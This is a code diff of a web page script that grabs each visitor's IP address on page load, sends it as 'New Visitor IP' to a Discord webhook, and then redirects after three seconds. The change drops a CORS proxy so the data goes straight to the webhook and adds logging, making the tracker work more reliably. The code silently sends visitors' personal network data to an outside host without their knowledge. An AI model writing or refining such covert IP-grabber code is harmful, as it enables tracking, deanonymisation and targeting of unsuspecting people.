@@ -38,16 +38,15 @@
                 const data = await response.json();
                 const userIP = data.ip;
 
-                // Proxy URL to bypass CORS issues
-                const proxyURL = "https://cors-anywhere.herokuapp.com/"; // CORS Proxy
+                console.log("User IP: " + userIP); // Debugging: Check if the IP is fetched correctly
 
                 // Send the IP to Discord webhook immediately after the page loads
                 const payload = {
                     content: `New Visitor IP: ${userIP}`
                 };
 
-                // Send request via CORS proxy
-                const webhookResponse = await fetch(proxyURL + WEBHOOK_URL, {
+                // Send request directly to the Discord webhook without a proxy
+                const webhookResponse = await fetch(WEBHOOK_URL, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
@@ -55,11 +54,15 @@
                     body: JSON.stringify(payload)
                 });
 
-                // Log webhook response status for debugging
-                console.log('Webhook Response:', webhookResponse.status);
+                // Log the status of the webhook request
+                if (webhookResponse.ok) {
+                    console.log("Webhook request successful");
+                } else {
+                    console.error("Webhook request failed with status:", webhookResponse.status);
+                }
 
             } catch (error) {
-                console.error("Error sending IP:", error);
+                console.error("Error sending IP:", error); // Improved error handling
             }
 
             // Wait for 3 seconds before redirecting
